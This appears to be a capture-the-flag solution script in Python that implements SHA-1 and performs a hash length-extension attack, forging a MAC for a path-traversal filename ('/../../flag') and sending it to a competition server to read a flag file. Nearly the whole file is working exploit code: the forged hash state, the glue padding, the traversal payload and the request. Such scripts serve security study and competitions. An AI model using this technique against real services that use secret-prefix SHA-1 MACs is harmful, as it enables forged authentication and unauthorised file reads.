import itertools

import requests
from utils.crypto.hash import sha1, sha1_padding
from utils.itertools2 import grouper


def grouper(iterable, n, *, incomplete="fill", fillvalue=None):
	"Collect data into non-overlapping fixed-length chunks or blocks"
	# grouper('ABCDEFG', 3, fillvalue='x') --> ABC DEF Gxx
	# grouper('ABCDEFG', 3, incomplete='strict') --> ABC DEF ValueError
	# grouper('ABCDEFG', 3, incomplete='ignore') --> ABC DEF
	args = [iter(iterable)] * n
	if incomplete == "fill":
		return itertools.zip_longest(*args, fillvalue=fillvalue)
	if incomplete == "strict":
		return zip(*args, strict=True)
	if incomplete == "ignore":
		return zip(*args)
	else:
		raise ValueError("Expected fill, strict, or ignore")


def rol(val, r_bits, max_bits):
	return (val << r_bits % max_bits) & (2**max_bits - 1) | (
		(val & (2**max_bits - 1)) >> (max_bits - (r_bits % max_bits))
	)


def sha1_padding(msg, forced_len=None):
	if forced_len is None:
		msg_len = len(msg) * 8
	else:
		msg_len = forced_len * 8
	m = -(msg_len + 1 + 64) % 512
	msg = (
		msg
		+ bytes([0b10000000])
		+ b"\x00" * (m // 8)
		+ msg_len.to_bytes(8, byteorder="big")
	)
	return msg


def sha1(msg, state=None, msg_added_len=None):  # noqa: PLR0914
	if state is None:
		h0 = 0x67452301
		h1 = 0xEFCDAB89
		h2 = 0x98BADCFE
		h3 = 0x10325476
		h4 = 0xC3D2E1F0
	else:
		h0, h1, h2, h3, h4 = state
	max_word = 0xFFFFFFFF
	if msg_added_len is None:
		msg = sha1_padding(msg)
	else:
		forced_len = len(msg) + msg_added_len
		msg = sha1_padding(msg, forced_len)
	for chunk in map(bytes, grouper(msg, 512 // 8)):
		words = [
			int.from_bytes(c, byteorder="big", signed=False)
			for c in map(bytes, grouper(chunk, 32 // 8))
		] + [-1] * (80 - 16)
		for i in range(16, 80):
			words[i] = rol(
				words[i - 3] ^ words[i - 8] ^ words[i - 14] ^ words[i - 16], 1, 32
			)
		a = h0
		b = h1
		c = h2
		d = h3
		e = h4
		for i in range(80):
			if i < 20:
				f = (b & c) | ((~b) & d)
				k = 0x5A827999
			elif i < 40:
				f = b ^ c ^ d
				k = 0x6ED9EBA1
			elif i < 60:
				f = (b & c) | (b & d) | (c & d)
				k = 0x8F1BBCDC
			else:
				f = b ^ c ^ d
				k = 0xCA62C1D6
			temp = (rol(a, 5, 32) + f + e + k + words[i]) & max_word
			e = d
			d = c
			c = rol(b, 30, 32)
			b = a
			a = temp
		h0 = (h0 + a) & max_word
		h1 = (h1 + b) & max_word
		h2 = (h2 + c) & max_word
		h3 = (h3 + d) & max_word
		h4 = (h4 + e) & max_word
	return b"".join(h.to_bytes(4, byteorder="big") for h in (h0, h1, h2, h3, h4))


def oracle(forged_mac, forged_msg):
	print(forged_msg)
	resp = requests.get(
		"http://chal.competitivecyber.club:7777/view.php",
		{"pic": forged_msg, "hash": forged_mac.hex()},
	)
	print(resp.text)


orig_hash = bytes.fromhex("06dadc9db741e1c2a91f266203f01b9224b5facf")
orig_msg = b"1.png"
new_msg = b"/../../../../../../../../../../../../flag"

# key_lens = itertools.count(1)
key_lens = [12]
for key_len in key_lens:
	glue_padding = sha1_padding(b"\x00" * key_len + orig_msg)[key_len + len(orig_msg) :]
	msg_added_len = key_len + len(orig_msg) + len(glue_padding)
	state = [int.from_bytes(c, byteorder="big") for c in grouper(orig_hash, 4)]
	forged_mac = sha1(new_msg, state, msg_added_len)
	forged_msg = orig_msg + glue_padding + new_msg
	oracle(forged_mac, forged_msg)
